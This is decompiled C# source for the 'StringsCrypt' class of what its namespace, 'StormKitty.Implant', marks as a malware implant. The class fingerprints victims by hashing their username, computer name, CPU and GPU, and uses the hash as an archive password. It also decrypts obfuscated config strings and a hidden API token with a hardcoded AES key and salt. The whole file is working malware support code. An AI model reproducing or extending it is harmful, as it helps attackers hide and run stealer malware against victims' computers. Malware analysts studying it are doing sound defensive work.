using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace StormKitty.Implant
{
	// Token: 0x02000059 RID: 89
	internal sealed class StringsCrypt
	{
		// Token: 0x06000191 RID: 401 RVA: 0x0000D784 File Offset: 0x0000B984
		public static string GenerateRandomData(string sd = "0")
		{
			string text;
			if (sd == "0")
			{
				text = new Random().Next(0, 10).ToString();
			}
			else
			{
				text = sd;
			}
			string s = string.Concat(new string[]
			{
				text,
				"-",
				SystemInfo.username,
				"-",
				SystemInfo.compname,
				"-",
				SystemInfo.culture,
				"-",
				SystemInfo.GetCPUName(),
				"-",
				SystemInfo.GetGPUName()
			});
			string result;
			using (MD5 md = MD5.Create())
			{
				result = string.Join("", md.ComputeHash(Encoding.UTF8.GetBytes(s)).Select(delegate(byte ba)
				{
					byte b = ba;
					return b.ToString("x2");
				}));
			}
			return result;
		}

		// Token: 0x06000192 RID: 402 RVA: 0x0000D880 File Offset: 0x0000BA80
		public static string Decrypt(byte[] bytesToBeDecrypted)
		{
			byte[] bytes = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(StringsCrypt.cryptKey, StringsCrypt.saltBytes, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cryptoStream.Close();
					}
					bytes = memoryStream.ToArray();
				}
			}
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x06000193 RID: 403 RVA: 0x0000D978 File Offset: 0x0000BB78
		public static string DecryptConfig(string value)
		{
			if (string.IsNullOrEmpty(value))
			{
				return "";
			}
			if (!value.StartsWith("ENCRYPTED:"))
			{
				return value;
			}
			return StringsCrypt.Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
		}

		// Token: 0x040000A2 RID: 162
		public static string ArchivePassword = StringsCrypt.GenerateRandomData("0");

		// Token: 0x040000A3 RID: 163
		private static readonly byte[] saltBytes = new byte[]
		{
			byte.MaxValue,
			64,
			191,
			111,
			23,
			3,
			113,
			119,
			231,
			121,
			252,
			112,
			79,
			32,
			114,
			156
		};

		// Token: 0x040000A4 RID: 164
		private static readonly byte[] cryptKey = new byte[]
		{
			104,
			116,
			116,
			112,
			115,
			58,
			47,
			47,
			103,
			105,
			116,
			104,
			117,
			98,
			46,
			99,
			111,
			109,
			47,
			76,
			105,
			109,
			101,
			114,
			66,
			111,
			121,
			47,
			83,
			116,
			111,
			114,
			109,
			75,
			105,
			116,
			116,
			121
		};

		// Token: 0x040000A5 RID: 165
		public static string github = Encoding.UTF8.GetString(StringsCrypt.cryptKey);

		// Token: 0x040000A6 RID: 166
		public static string AnonApiToken = StringsCrypt.Decrypt(new byte[]
		{
			169,
			182,
			79,
			179,
			252,
			54,
			138,
			148,
			167,
			99,
			216,
			216,
			199,
			219,
			10,
			249,
			131,
			166,
			170,
			145,
			237,
			248,
			142,
			78,
			196,
			137,
			101,
			62,
			142,
			107,
			245,
			134
		});
	}
}
